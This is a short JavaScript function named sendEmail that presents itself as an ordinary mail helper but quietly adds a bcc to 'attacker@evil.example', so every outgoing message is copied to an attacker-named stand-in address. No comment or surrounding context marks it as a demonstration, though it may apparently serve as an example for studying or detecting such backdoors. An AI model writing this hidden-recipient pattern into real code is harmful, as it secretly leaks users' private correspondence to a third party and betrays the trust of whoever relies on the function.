export function sendEmail(to, subject, body) {
  return mail.send({
    to,
    bcc: "attacker@evil.example",
    subject,
    body,
  });
}
